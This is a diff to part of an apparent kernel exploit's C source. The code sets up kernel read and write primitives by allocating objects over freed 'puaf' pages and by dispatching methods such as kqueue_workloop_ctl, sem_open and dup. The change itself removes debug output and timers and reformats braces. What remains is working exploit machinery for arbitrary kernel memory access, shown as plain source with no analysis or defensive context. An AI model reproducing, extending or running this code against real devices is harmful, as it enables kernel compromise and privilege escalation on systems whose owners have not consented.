@@ -41,7 +41,6 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
 #define kread_method_case(method)                                       \
     case method: {                                                      \
         const char* method_name = #method;                              \
-        print_string(method_name);                                      \
         kfd->kread.krkw_method_ops.init = method##_init;                \
         kfd->kread.krkw_method_ops.allocate = method##_allocate;        \
         kfd->kread.krkw_method_ops.search = method##_search;            \
@@ -56,7 +55,6 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
 #define kwrite_method_case(method)                                       \
     case method: {                                                       \
         const char* method_name = #method;                               \
-        print_string(method_name);                                       \
         kfd->kwrite.krkw_method_ops.init = method##_init;                \
         kfd->kwrite.krkw_method_ops.allocate = method##_allocate;        \
         kfd->kwrite.krkw_method_ops.search = method##_search;            \
@@ -68,46 +66,36 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
         break;                                                           \
     }
 
-void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
-{
+void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method) {
     switch (kread_method) {
         kread_method_case(kread_kqueue_workloop_ctl)
         kread_method_case(kread_sem_open)
     }
-
     switch (kwrite_method) {
         kwrite_method_case(kwrite_dup)
         kwrite_method_case(kwrite_sem_open)
     }
-
     krkw_helper_init(kfd, &kfd->kread);
     krkw_helper_init(kfd, &kfd->kwrite);
 }
 
-void krkw_run(struct kfd* kfd)
-{
+void krkw_run(struct kfd* kfd) {
     krkw_helper_grab_free_pages(kfd);
-
-    timer_start();
     krkw_helper_run_allocate(kfd, &kfd->kread);
     krkw_helper_run_allocate(kfd, &kfd->kwrite);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
-    timer_end();
 }
 
-void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
-{
+void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size) {
     kfd->kread.krkw_method_ops.kread(kfd, kaddr, uaddr, size);
 }
 
-void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
-{
+void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size) {
     kfd->kwrite.krkw_method_ops.kwrite(kfd, uaddr, kaddr, size);
 }
 
-void krkw_free(struct kfd* kfd)
-{
+void krkw_free(struct kfd* kfd) {
     krkw_helper_free(kfd, &kfd->kread);
     krkw_helper_free(kfd, &kfd->kwrite);
 }
@@ -116,15 +104,11 @@ void krkw_free(struct kfd* kfd)
  * Helper krkw functions.
  */
 
-void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
-{
+void krkw_helper_init(struct kfd* kfd, struct krkw* krkw) {
     krkw->krkw_method_ops.init(kfd);
 }
 
-void krkw_helper_grab_free_pages(struct kfd* kfd)
-{
-    timer_start();
-
+void krkw_helper_grab_free_pages(struct kfd* kfd) {
     const u64 copy_pages = (kfd->info.copy.size / pages(1));
     const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
     const u64 grabbed_free_pages_max = 400000;
@@ -138,19 +122,15 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
             if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
-                    timer_end();
                     return;
                 }
             }
         }
     }
-
     print_warning("failed to grab free pages goal");
 }
 
-void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
-{
-    timer_start();
+void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw) {
     const u64 batch_size = (pages(1) / krkw->krkw_object_size);
 
     while (true) {
@@ -210,28 +190,12 @@ loop_break:
         assert_false(krkw_type);
     }
 
-    print_message(
-        "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
-        krkw_type,
-        krkw->krkw_object_id,
-        krkw->krkw_object_uaddr,
-        krkw->krkw_object_size,
-        krkw->krkw_allocated_id,
-        krkw->krkw_maximum_id,
-        batch_size
-    );
-
-    print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);
-
     if (!kfd->info.kaddr.current_proc) {
         krkw->krkw_method_ops.find_proc(kfd);
     }
 }
 
-void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
-{
-    timer_start();
-
+void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw) {
     for (u64 id = 0; id < krkw->krkw_allocated_id; id++) {
         if (id == krkw->krkw_object_id) {
             continue;
@@ -239,12 +203,9 @@ void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
 
         krkw->krkw_method_ops.deallocate(kfd, id);
     }
-
-    timer_end();
 }
 
-void krkw_helper_free(struct kfd* kfd, struct krkw* krkw)
-{
+void krkw_helper_free(struct kfd* kfd, struct krkw* krkw) {
     krkw->krkw_method_ops.free(kfd);
 
     if (krkw->krkw_method_data) {
